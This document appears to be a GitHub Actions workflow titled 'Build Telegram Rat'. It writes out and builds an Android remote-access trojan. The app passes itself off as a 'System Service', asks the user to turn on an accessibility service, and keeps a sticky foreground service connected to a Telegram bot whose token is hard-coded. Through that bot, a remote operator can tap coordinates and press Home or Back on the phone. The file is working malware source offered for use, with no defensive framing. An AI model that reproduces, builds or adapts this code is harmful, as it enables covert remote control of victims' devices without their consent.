name: Build Telegram Rat
on: [push, workflow_dispatch]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      
      - uses: actions/setup-java@v4
        with:
          distribution: 'temurin'
          java-version: '17'
          
      - name: Create Project Structure
        run: |
          mkdir -p app/src/main/java/com/test/rat
          mkdir -p app/src/main/res/xml
          
          cat > app/src/main/AndroidManifest.xml <<'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.test.rat">
              <uses-permission android:name="android.permission.INTERNET"/>
              <application android:label="System Service" android:theme="@android:style/Theme.NoTitleBar">
                  <activity android:name=".MainActivity" android:exported="true">
                      <intent-filter>
                          <action android:name="android.intent.action.MAIN"/>
                          <category android:name="android.intent.category.LAUNCHER"/>
                      </intent-filter>
                  </activity>
                  <service android:name=".BotService" android:exported="false"/>
                  <service android:name=".TapService" android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE" android:exported="true">
                      <intent-filter><action android:name="android.accessibilityservice.AccessibilityService"/></intent-filter>
                      <meta-data android:name="android.accessibilityservice" android:resource="@xml/accessibility_service_config"/>
                  </service>
              </application>
          </manifest>
          EOF

          cat > app/src/main/res/xml/accessibility_service_config.xml <<'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <accessibility-service xmlns:android="http://schemas.android.com/apk/res/android" android:accessibilityEventTypes="typeAllMask" android:canPerformGestures="true" />
          EOF

          cat > app/src/main/java/com/test/rat/MainActivity.java <<'EOF'
          package com.test.rat;
          import android.app.Activity;
          import android.content.Intent;
          import android.os.Bundle;
          import android.widget.Button;
          import android.widget.LinearLayout;
          import android.provider.Settings;
          import android.view.View;

          public class MainActivity extends Activity {
              @Override protected void onCreate(Bundle savedInstanceState) {
                  super.onCreate(savedInstanceState);
                  LinearLayout l = new LinearLayout(this); l.setOrientation(1);
                  Button b1 = new Button(this); b1.setText("Запустить бота");
                  b1.setOnClickListener(new View.OnClickListener() { @Override public void onClick(View v) { startForegroundService(new Intent(MainActivity.this, BotService.class)); } });
                  Button b2 = new Button(this); b2.setText("Включить управление");
                  b2.setOnClickListener(new View.OnClickListener() { @Override public void onClick(View v) { startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)); } });
                  l.addView(b1); l.addView(b2); setContentView(l);
              }
          }
          EOF

          cat > app/src/main/java/com/test/rat/BotService.java <<'EOF'
          package com.test.rat;
          import android.app.*;
          import android.content.Intent;
          import android.os.*;
          import org.telegram.telegrambots.bots.TelegramLongPollingBot;
          import org.telegram.telegrambots.meta.TelegramBotsApi;
          import org.telegram.telegrambots.meta.api.objects.Update;
          import org.telegram.telegrambots.meta.api.methods.send.SendMessage;
          import org.telegram.telegrambots.updatesreceivers.DefaultBotSession;

          public class BotService extends Service {
              private Thread botThread;
              @Override public int onStartCommand(Intent intent, int flags, int startId) {
                  NotificationChannel ch = new NotificationChannel("bot", "Bot", NotificationManager.IMPORTANCE_LOW);
                  ((NotificationManager)getSystemService(NOTIFICATION_SERVICE)).createNotificationChannel(ch);
                  startForeground(1, new Notification.Builder(this, "bot").setContentTitle("Service Running").build());

                  botThread = new Thread(new Runnable() {
                      @Override public void run() {
                          try {
                              TelegramBotsApi api = new TelegramBotsApi(DefaultBotSession.class);
                              api.registerBot(new MyBot());
                          } catch (Exception e) { e.printStackTrace(); }
                      }
                  });
                  botThread.start();
                  return START_STICKY;
              }

              public static class MyBot extends TelegramLongPollingBot {
                  @Override public String getBotUsername() { return "YourBot"; }
                  @Override public String getBotToken() { return "8728231995:AAEigsex63b_sSSfAS30Ivzcpk_3DzL97HM"; }

                  @Override public void onUpdateReceived(Update update) {
                      if (update.hasMessage() && update.getMessage().hasText()) {
                          String text = update.getMessage().getText();
                          long chatId = update.getMessage().getChatId();
                          
                          if (text.startsWith("/tap ")) {
                              TapService.executeCommand(text.substring(1)); 
                          } else if (text.equals("/home")) {
                              TapService.executeCommand("HOME");
                          } else if (text.equals("/back")) {
                              TapService.executeCommand("BACK");
                          }
                          
                          try {
                              execute(new SendMessage(String.valueOf(chatId), "Команда: " + text));
                          } catch (Exception e) {}
                      }
                  }
              }
              @Override public IBinder onBind(Intent intent) { return null; }
          }
          EOF

          cat > app/src/main/java/com/test/rat/TapService.java <<'EOF'
          package com.test.rat;
          import android.accessibilityservice.*;
          import android.view.accessibility.AccessibilityEvent;
          import android.graphics.Path;

          public class TapService extends AccessibilityService {
              public static TapService instance;
              @Override public void onServiceConnected() { instance = this; }
              @Override public void onAccessibilityEvent(AccessibilityEvent e) {}
              @Override public void onInterrupt() {}

              public static void executeCommand(String cmd) {
                  if (instance == null) return;
                  if (cmd.equals("HOME")) {
                      instance.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME);
                  } else if (cmd.equals("BACK")) {
                      instance.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK);
                  } else if (cmd.startsWith("tap ")) {
                      String[] a = cmd.split(" ");
                      if(a.length == 3) {
                          Path p = new Path(); p.moveTo(Float.parseFloat(a[1]), Float.parseFloat(a[2]));
                          instance.dispatchGesture(new GestureDescription.Builder().addStroke(new GestureDescription.StrokeDescription(p, 0, 50)).build(), null, null);
                      }
                  }
              }
          }
          EOF

          cat > app/build.gradle <<'EOF'
          plugins { id 'com.android.application' }
          android {
              namespace 'com.test.rat'
              compileSdk 33
              defaultConfig { applicationId "com.test.rat"; minSdk 24; targetSdk 33; versionCode 1; versionName "1.0" }
              compileOptions { sourceCompatibility JavaVersion.VERSION_1_8; targetCompatibility JavaVersion.VERSION_1_8 }
              
              packagingOptions {
                  exclude 'META-INF/DEPENDENCIES'
                  exclude 'META-INF/LICENSE'
                  exclude 'META-INF/LICENSE.txt'
                  exclude 'META-INF/NOTICE'
                  exclude 'META-INF/NOTICE.txt'
                  exclude 'META-INF/NOTICE.md'
                  exclude 'META-INF/ASL2.0'
                  exclude 'META-INF/*.kotlin_module'
              }
          }
          dependencies {
              implementation 'org.telegram:telegrambots:6.8.0'
          }
          EOF

          cat > build.gradle <<'EOF'
          buildscript { repositories { google(); mavenCentral() }; dependencies { classpath 'com.android.tools.build:gradle:8.1.0' } }
          allprojects { repositories { google(); mavenCentral() } }
          EOF
          cat > settings.gradle <<'EOF'
          rootProject.name = "RatBot"
          include ':app'
          EOF

      - name: Setup Gradle
        uses: gradle/actions/setup-gradle@v3
        with:
          gradle-version: '8.5'

      - name: Build with Gradle
        run: gradle assembleDebug

      - name: Upload APK
        uses: actions/upload-artifact@v4
        with:
          name: bot-apk
          path: app/build/outputs/apk/debug/app-debug.apk
